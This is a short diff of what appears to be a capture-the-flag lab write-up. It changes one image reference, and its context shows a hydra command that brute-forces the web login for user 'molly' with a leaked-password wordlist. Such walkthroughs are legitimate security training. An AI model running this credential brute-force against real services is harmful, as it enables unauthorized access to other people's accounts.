@@ -8,7 +8,7 @@
 
 Opened up the webconsole and tried entering the credentials to see what the request would look like. We can see the failed login attempt message and the fields used for login which we can used to craft our hydra command.
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 `hydra -l molly -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt 10.10.132.200 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V`
 
